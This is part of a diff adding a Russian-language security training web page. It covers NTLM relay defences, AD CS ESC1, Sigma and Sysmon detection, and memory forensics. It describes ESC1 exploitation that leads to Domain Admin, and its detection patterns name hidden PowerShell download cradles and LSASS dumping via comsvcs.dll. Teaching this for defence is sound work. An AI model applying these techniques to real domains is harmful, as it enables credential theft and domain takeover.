+                    <div><strong>Type 2 (Challenge):</strong> Сервер генерирует случайную 8-байтную последовательность чисел — Server Challenge ($C$).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div><strong>Type 3 (Authenticate):</strong> Клиент вычисляет хэш ответа: $R = \text{HMAC-MD5}(\text{NTLM\_Hash}, C \parallel \text{ClientChallenge})$ и отправляет серверу.</div>
+                  </div>
+                </div>
+                <p>
+                  <strong>Фундаментальная причина Pass-the-Hash:</strong> Исходный пароль в открытом виде <em>вообще никогда не используется в формуле</em>! Входным параметром математической функции является сам <strong>NTLM-хэш</strong> (хэш MD4 от UTF-16LE строки пароля). Следовательно, для протокола NTLM знание хэша равносильно знанию самого пароля.
+                </p>
+
+                <div class="theory-subheading">Механика NTLM Relay и обход цифровой подписи (SMB Signing)</div>
+                <p>
+                  Если клиент обращается к машине атакующего (например, в результате WPAD Spoofing или LLMNR/NBT-NS Poisoning), атакующий в режиме реального времени транслирует полученный Type 2 Challenge на третий корпоративный сервер (Exchange, LDAP, файловый сервер) и возвращает ответ клиента.
+                </p>
+                <p>
+                  <strong>Защита:</strong>
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><strong>Обязательная подпись SMBv2/v3 (SMB Signing):</strong> Сессия криптографически связывается с сессионным ключом. Подмена пакетов в канале невозможна.</li>
+                  <li><strong>Extended Protection for Authentication (EPA):</strong> Привязывает учетные данные к TLS-каналу сервера (Channel Binding Tokens).</li>
+                  <li><strong>Группа Protected Users:</strong> Запрещает кэширование NTLM хэшей в LSASS и принудительно переводит хосты только на Kerberos AES.</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="pth-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 4.2: Включение обязательной подписи SMB через групповые политики (GPO)</div>
+                      <div class="task-desc">Сконфигурировать политику безопасности Windows для запрета неподписанных SMB-соединений.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Политика: <em>«Microsoft network server: Digitally sign communications (always)»</em>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options:
+"Microsoft network client: Digitally sign communications (always)" = Enabled
+"Microsoft network server: Digitally sign communications (always)" = Enabled</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 4.3 AD CS -->
+        <article class="topic-card" id="topic-adcs" data-roles="red blue">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>4.3 Active Directory Certificate Services (AD CS): Мисконфигурации шаблонов сертификатов и атака ESC1</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1649</span>
+                <span class="badge badge-level-hard">AD PKI ARCHITECTURE</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Инфраструктура открытых ключей в Active Directory (PKI)</div>
+                <p>
+                  AD CS позволяет развернуть доменный Центр Сертификации (Enterprise CA), выпускающий сертификаты для шифрования, аутентификации пользователей и смарт-карт на базе <strong>шаблонов сертификатов (Certificate Templates)</strong>.
+                </p>
+                <div class="theory-subheading">Анатомия критической уязвимости ESC1</div>
+                <p>
+                  Шаблон сертификата становится уязвимым к мгновенной компрометации всего домена (ESC1), если одновременно выполняются 4 условия:
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>Права доступа (Enrollment Rights):</strong> Обычные пользователи (Domain Users / Authenticated Users) имеют право запрашивать сертификат по этому шаблону.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div><strong>Флаг SAN (Subject Alternative Name):</strong> Включен флаг <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>. Это разрешает заявителю самому указать, на чье имя выпустить сертификат!</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div><strong>Назначение (EKU — Extended Key Usage):</strong> Шаблон разрешает аутентификацию клиента (<code>Client Authentication</code>, <code>Smartcard Logon</code> или <code>Any Purpose</code>).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">4</div>
+                    <div><strong>Утверждение менеджера:</strong> Выключено требование предварительного одобрения администратором (Manager Approval).</div>
+                  </div>
+                </div>
+                <p>
+                  <strong>Эксплуатация:</strong> Обычный пользователь запрашивает сертификат, передавая в поле SAN имя <code>Administrator@corp.local</code>. Центр сертификации генерирует действительный сертификат. Атакующий использует сертификат для запроса доменного TGT-билета через Kerberos PKINIT (утилита Certipy / Rubeus) и становится <strong>Domain Admin</strong>!
+                </p>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="adcs-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 4.3: Аудит шаблонов сертификатов AD CS через PowerShell</div>
+                      <div class="task-desc">Выявить шаблоны сертификатов с опасным флагом <code>ENROLLEE_SUPPLIES_SUBJECT</code> и EKU клиентской аутентификации.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Проверьте атрибут <code>msPKI-Certificate-Name-Flag</code> в объектах Active Directory.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code># Поиск флага 0x00000001 (ENROLLEE_SUPPLIES_SUBJECT)
+Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties * | Where-Object { $_."msPKI-Certificate-Name-Flag" -band 1 }</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <!-- =====================================================================
+           МОДУЛЬ 5: DETECTION ENGINEERING, SIEM & INCIDENT RESPONSE
+           ===================================================================== -->
+      <section class="module-section">
+        <div class="module-header">
+          <div class="module-title-wrap">
+            <div class="module-num">05</div>
+            <div>
+              <h2 class="module-title">Detection Engineering, SIEM и Incident Response</h2>
+              <div class="module-desc">Стандарт правил Sigma, концепция Pyramid of Pain, телеметрия Sysmon & Auditd и цифровой порядок энергозависимости (RFC 3227)</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 5.1 Sigma Rules -->
+        <article class="topic-card" id="topic-sigma" data-roles="blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>5.1 Инженерия правил Sigma, матрица MITRE ATT&CK и концепция Pyramid of Pain</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE ATT&CK</span>
+                <span class="badge badge-level-mid">SOC ENGINEERING</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Концепция «Пирамиды Боли» (David Bianco: The Pyramid of Pain)</div>
+                <p>
+                  Эффективность детектов в SOC измеряется тем, насколько тяжело злоумышленнику обойти созданное правило:
+                </p>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Уровень индикатора</th>
+                        <th>Сложность обхода для атакующего</th>
+                        <th>Стабильность детекта</th>
+                        <th>Пример индикатора</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Хэши (MD5 / SHA256)</strong></td>
+                        <td><span style="color: var(--accent-emerald);">Тривиальная (Trivial)</span></td>
+                        <td>Минуты (изменение 1 байта кода меняет весь хэш).</td>
+                        <td><code>e3b0c44298fc1c149afbf4c8996fb924...</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>IP-адреса</strong></td>
+                        <td><span style="color: var(--accent-emerald);">Легкая (Easy)</span></td>
+                        <td>Часы (аренда нового VPS или прокси).</td>
+                        <td><code>198.51.100.45</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Доменные имена</strong></td>
+                        <td><span style="color: var(--accent-amber);">Простая (Simple)</span></td>
+                        <td>Дни (регистрация нового домена, DGA).</td>
+                        <td><code>c2-sync-service.top</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Сетевые / Хостовые артефакты</strong></td>
+                        <td><span style="color: var(--accent-amber);">Раздражающая (Annoying)</span></td>
+                        <td>Недели (смена User-Agent, имени мьютекса, пути в реестре).</td>
+                        <td>URI: <code>/beacon.php</code>, Mutex: <code>Global\Payload12</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Инструменты (Tools)</strong></td>
+                        <td><span style="color: var(--accent-crimson);">Сложная (Challenging)</span></td>
+                        <td>Месяцы (переписывание утилиты, обфускация).</td>
+                        <td>Mimikatz, BloodHound, Impacket.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>TTPs (Тактики, техники, процедуры)</strong></td>
+                        <td><span style="color: var(--accent-crimson); font-weight: bold;">Невыносимая (Tough)</span></td>
+                        <td><strong>Годы.</strong> Требует изменения фундаментального метода атаки.</td>
+                        <td>Process Hollowing, Kerberoasting, DLL Sideloading.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Спецификация стандарта Sigma</div>
+                <p>
+                  Правило Sigma описывает логику обнаружения в декларативном формате YAML с разделением на секции:
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><code>logsource</code>: Категория источников данных (<code>process_creation</code>, <code>network_connection</code>, <code>dns_query</code>) и продукт (<code>windows</code>, <code>linux</code>).</li>
+                  <li><code>detection</code>: Селекторы полей (с модификаторами <code>contains</code>, <code>endswith</code>, <code>all</code>, <code>re</code>) и логические операторы условия (<code>condition: selection and not filter</code>).</li>
+                  <li><code>tags</code>: Привязка к матрице MITRE ATT&CK (например, <code>attack.t1059.001</code>).</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🟣 Правило Sigma (YAML)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">⚡ Сгенерированный Elastic DSL</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code>title: Скрытый запуск PowerShell со скачиванием кодовой нагрузки
+id: d58b3f11-23a4-4a55-8910-c0ffeebabe01
+status: test
+description: Обнаружение запуска PowerShell с флагами скрытого окна и вызовом WebClient/DownloadString
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_proc:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_flags:
+        CommandLine|contains|all:
+            - '-w'
+            - 'hidden'
+    selection_network:
+        CommandLine|contains:
+            - 'DownloadString'
+            - 'DownloadFile'
+            - 'Invoke-WebRequest'
+            - 'iwr'
+    condition: selection_proc and selection_flags and selection_network
+level: high
+tags:
+    - attack.execution
+    - attack.t1059.001</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># Результат трансляции через sigma-cli в Elasticsearch Query DSL:
+{
+  "query": {
+    "bool": {
+      "must": [
+        {
+          "terms": {
+            "process.executable.text": [
+              "*\\\\powershell.exe",
+              "*\\\\pwsh.exe"
+            ]
+          }
+        },
+        {
+          "bool": {
+            "must": [
+              { "wildcard": { "process.command_line": "*-w*" } },
+              { "wildcard": { "process.command_line": "*hidden*" } }
+            ]
+          }
+        },
+        {
+          "bool": {
+            "should": [
+              { "wildcard": { "process.command_line": "*DownloadString*" } },
+              { "wildcard": { "process.command_line": "*DownloadFile*" } },
+              { "wildcard": { "process.command_line": "*Invoke-WebRequest*" } },
+              { "wildcard": { "process.command_line": "*iwr*" } }
+            ]
+          }
+        }
+      ]
+    }
+  }
+}</code></pre>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sigma-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 5.1: Написание правила Sigma для выявления дампинга памяти LSASS</div>
+                      <div class="task-desc">Описать правило на доступ к процессу <code>lsass.exe</code> утилитой <code>procdump.exe</code> или <code>rundll32.exe comsvcs.dll</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Используйте категорию <code>process_creation</code>, отслеживая аргументы командной строки с вызовом <code>MiniDump</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>CommandLine|contains|all:
+  - 'comsvcs.dll'
+  - 'MiniDump'</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 5.2 Sysmon & Auditd -->
+        <article class="topic-card" id="topic-sysmon" data-roles="blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>5.2 Телеметрия хостов: Матрица событий Windows Sysmon и подсистема аудита ядра Linux Auditd</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE ATT&CK</span>
+                <span class="badge badge-level-mid">SIEM TELEMETRY</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Справочная таблица критических событий Microsoft Sysmon (System Monitor)</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Sysmon Event ID</th>
+                        <th>Название события</th>
+                        <th>Ключевые поля телеметрии</th>
+                        <th>Сценарий угрозы / Техника ATT&CK</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Event ID 1</strong></td>
+                        <td>Process Creation</td>
+                        <td><code>Image</code>, <code>CommandLine</code>, <code>ParentImage</code>, <code>ParentCommandLine</code>, <code>User</code>, <code>Hashes</code></td>
+                        <td>Запуск вредоносных бинарников, Living Off The Land (LOLBins), скриптовые оболочки.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 3</strong></td>
+                        <td>Network Connection Detected</td>
+                        <td><code>DestinationIp</code>, <code>DestinationPort</code>, <code>Protocol</code>, <code>Image</code>, <code>Initiated</code></td>
+                        <td>Исходящие C2-маяки (Command and Control), DNS эксфильтрация, горизонтальное перемещение.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 7</strong></td>
+                        <td>Image Loaded (DLL Load)</td>
+                        <td><code>ImageLoaded</code>, <code>SignatureStatus</code>, <code>Signed</code>, <code>Hashes</code></td>
+                        <td>DLL Sideloading, внедрение вредоносных библиотек в доверенные процессы.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 8</strong></td>
+                        <td>CreateRemoteThread</td>
+                        <td><code>SourceImage</code>, <code>TargetImage</code>, <code>StartAddress</code></td>
+                        <td>Внедрение шеллкода в чужие процессы (Process Injection: svchost, explorer).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 10</strong></td>
+                        <td>ProcessAccess</td>
+                        <td><code>SourceImage</code>, <code>TargetImage</code>, <code>GrantedAccess</code> (0x1010, 0x1F0FFF)</td>
+                        <td>Дампинг учетных данных из памяти <code>lsass.exe</code> (Mimikatz, Task Manager dump).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 11</strong></td>
+                        <td>FileCreate</td>
+                        <td><code>TargetFilename</code>, <code>CreationUtcTime</code></td>
+                        <td>Дроп программ-вымогателей (Ransomware), закрепление в автозагрузке.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Event ID 13</strong></td>
+                        <td>RegistryEvent (Value Set)</td>
+                        <td><code>TargetObject</code>, <code>Details</code></td>
+                        <td>Закрепление в системе через ключи <code>Run</code>, <code>RunOnce</code>, AppInit_DLLs.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Подсистема аудита ядра Linux (Auditd Framework)</div>
+                <p>
+                  Демон <code>auditd</code> подключается напрямую к подсистеме аудита ядра Linux через Netlink-сокеты. Правила позволяют логировать любые системные вызовы с привязкой к реальному пользователю:
+                </p>
+                <div class="math-block">
+                  # Отслеживание изменения файла паролей shadow:<br>
+                  -w /etc/shadow -p wa -k shadow_modification<br><br>
+                  # Отслеживание изменения capabilities файлов:<br>
+                  -a always,exit -F arch=b64 -S setxattr,fsetxattr,lsetxattr -k cap_changes<br><br>
+                  # Отслеживание выполнения команд через execve отладчиком ptrace:<br>
+                  -a always,exit -F arch=b64 -S ptrace -k process_injection
+                </div>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sysmon-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 5.2: Корреляция создания процесса и открытия сетевого сокета</div>
+                      <div class="task-desc">Написать правило корреляции для SIEM: запуск <code>cmd.exe</code> или <code>powershell.exe</code> как дочернего процесса <code>w3wp.exe</code> с немедленным сетевым соединением.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Свяжите Event ID 1 (ParentImage: w3wp.exe) и Event ID 3 по полю <code>ProcessGuid</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>EventID: 1 AND ParentImage: "*\\w3wp.exe" AND Image: ("*\\cmd.exe" OR "*\\powershell.exe")</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 5.3 IR Playbook & Memory Forensics -->
+        <article class="topic-card" id="topic-ir" data-roles="blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>5.3 Incident Response (DFIR): Жизненный цикл NIST SP 800-61, порядок энергозависимости (RFC 3227) и форензика RAM</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">DFIR STANDARDS</span>
+                <span class="badge badge-level-hard">INCIDENT RESPONSE</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Порядок сбора цифровых доказательств по энергозависимости (RFC 3227)</div>
+                <p>
+                  При расследовании инцидента первое правило судебного эксперта — <strong>не перезагружать и не выключать скомпрометированный сервер</strong>! 
+                  По спецификации <span class="rfc-badge">RFC 3227</span> (Order of Volatility) сбор артефактов производится от наиболее нестабильных носителей к долговечным:
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>Регистры и кэш процессора (CPU Registers & Cache):</strong> Уничтожаются за наносекунды при переключении контекста.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div><strong>Таблицы маршрутизации, кэш ARP, таблица активных сетевых соединений в ядре.</strong></div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div><strong>Оперативная память (RAM):</strong> Содержит бестелесные шеллкоды, ключи шифрования, незашифрованные пароли и внедренные потоки.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">4</div>
+                    <div><strong>Временные файловые системы (/tmp, pagefile.sys, hiberfil.sys).</strong></div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">5</div>
+                    <div><strong>Энергонезависимые накопители (SSD/HDD) и резервные архивные копии.</strong></div>
+                  </div>
+                </div>
+
+                <div class="theory-subheading">Анализ дампа оперативной памяти утилитой Volatility 3</div>
+                <p>
+                  Фреймворк Volatility парсит структуры ядра внутри бинарного дампа памяти (Raw memory image):
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li><code>vol -f mem.raw windows.pslist</code>: Выводит дерево процессов хоста.</li>
+                  <li><code>vol -f mem.raw windows.malfind</code>: Ищет участки памяти с флагами <code>PAGE_EXECUTE_READWRITE</code> (типичный признак внедрения шеллкода).</li>
+                  <li><code>vol -f mem.raw windows.netscan</code>: Восстанавливает сетевые сокеты и IP-адреса, открытые на момент создания дампа.</li>
+                </ul>
+              </div>
+            </div>
+
+            <!-- Tasks -->
+            <div class="tasks-container">
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="ir-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 5.3: Анализ подозрительного потока памяти в Volatility</div>
+                      <div class="task-desc">Сформировать команду для выявления инжектированного шеллкода в памяти процесса explorer.exe.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Используйте плагин <code>windows.malfind</code> с фильтром по PID.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>vol -f memory_dump.raw windows.malfind --pid 1420</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- =========================================================================
+       MODAL: DOCKER LAB QUICKSTART
+       ========================================================================= -->
+  <div class="modal-overlay" id="lab-modal">
+    <div class="modal-card">
+      <div class="modal-header">
+        <h3><span>📦</span> Локальный лабораторный стенд (Docker Compose)</h3>
+        <button class="modal-close" id="close-lab-modal-btn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p style="color: var(--text-muted); font-size: 14px;">
+          Стенд содержит изолированный уязвимый микросервис на Python Flask, защищенное хранилище секретов в изолированной подсети, Nginx WAF (ModSecurity), NIDS Suricata и тестовый стенд OWASP Juice Shop.
+        </p>
+
+        <h4 style="color: #fff; font-size: 14px; margin-top: 10px;">Шаги запуска:</h4>
+        <div style="background: #090d16; padding: 12px 16px; border-radius: 6px; font-family: var(--font-mono); font-size: 12.5px; color: var(--accent-cyan);">
+          # 1. Перейдите в каталог лабораторного стенда<br>
+          cd lab<br><br>
+          # 2. Запустите изолированные контейнеры<br>
+          docker compose up -d<br><br>
+          # 3. Проверьте статус контейнеров<br>
+          docker compose ps
+        </div>
+
+        <h4 style="color: #fff; font-size: 14px; margin-top: 10px;">Доступные адреса в стенде:</h4>
+        <ul style="color: var(--text-muted); font-size: 13.5px; padding-left: 20px;">
+          <li><strong>Уязвимый бэкенд:</strong> <code>http://localhost:5000</code></li>
+          <li><strong>WAF Прокси (ModSecurity):</strong> <code>http://localhost:8080</code></li>
+          <li><strong>OWASP Juice Shop:</strong> <code>http://localhost:3000</code></li>
+          <li><strong>Internal Vault (изолирован):</strong> Доступен только изнутри сети контейнеров (<code>http://172.28.2.50:8080</code>)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
